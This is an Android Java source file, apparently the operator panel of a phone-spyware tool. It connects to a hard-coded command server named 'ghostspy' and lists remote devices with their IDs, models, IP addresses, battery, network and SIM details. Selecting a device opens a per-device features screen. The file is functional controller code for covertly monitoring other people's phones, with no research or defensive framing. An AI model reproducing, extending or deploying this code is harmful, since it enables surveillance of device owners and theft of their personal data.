package com.testapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private Socket socket;
    private TextView statusText;
    private LinearLayout deviceContainer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.statusText);
        deviceContainer = findViewById(R.id.deviceContainer);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
        } catch (URISyntaxException e) {
            statusText.setText("❌ URL Error");
            return;
        }

        socket.on(Socket.EVENT_CONNECT, args -> {
            runOnUiThread(() -> {
                statusText.setText("🟢 ONLINE");
                socket.emit("get_devices");
            });
        });

        socket.on("devices_list", args -> {
            try {
                JSONArray devices = (JSONArray) args[0];
                List<String[]> list = new ArrayList<>();
                for (int i = 0; i < devices.length(); i++) {
                    JSONObject d = devices.getJSONObject(i);
                    list.add(new String[]{
                        d.getString("id"),
                        d.getString("model"),
                        d.optString("android", "?"),
                        d.optString("last_seen", ""),
                        d.optString("ip", ""),
                        d.optString("battery", "?"),
                        d.optString("network", "?"),
                        d.optString("sim1", "?"),
                        d.optString("sim2", "?")
                    });
                }
                runOnUiThread(() -> {
                    deviceContainer.removeAllViews();
                    for (String[] data : list) {
                        LinearLayout item = new LinearLayout(MainActivity.this);
                        item.setOrientation(LinearLayout.VERTICAL);
                        item.setBackground(getDrawable(R.drawable.card_border));
                        item.setPadding(20, 20, 20, 20);
                        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
                        lp.setMargins(0, 0, 0, 12);
                        item.setLayoutParams(lp);

                        TextView idView = new TextView(MainActivity.this);
                        idView.setText("🆔 " + data[0]);
                        idView.setTextColor(0xFFFF1E5A);
                        idView.setTextSize(16);

                        TextView modelView = new TextView(MainActivity.this);
                        modelView.setText("📱 " + data[1] + " | " + data[2]);
                        modelView.setTextColor(0xFFFFFFFF);
                        modelView.setTextSize(14);

                        TextView ipView = new TextView(MainActivity.this);
                        ipView.setText("IP: " + data[4] + " | Bat: " + data[5] + "%");
                        ipView.setTextColor(0xFF9AA3B2);
                        ipView.setTextSize(12);

                        item.addView(idView);
                        item.addView(modelView);
                        item.addView(ipView);

                        item.setOnClickListener(v -> {
                            Intent i = new Intent(MainActivity.this, FeaturesActivity.class);
                            i.putExtra("deviceId", data[0]);
                            i.putExtra("deviceModel", data[1]);
                            startActivity(i);
                        });

                        deviceContainer.addView(item);
                    }
                    statusText.setText("🟢 ONLINE | " + list.size() + " devices");
                });
            } catch (Exception e) {
                runOnUiThread(() -> statusText.setText("⚠️ Parse error"));
            }
        });

        socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
            runOnUiThread(() -> statusText.setText("🔴 OFFLINE"));
        });

        socket.connect();
    }

    @Override
    protected void onDestroy() {
        if (socket != null) socket.disconnect();
        super.onDestroy();
    }
}
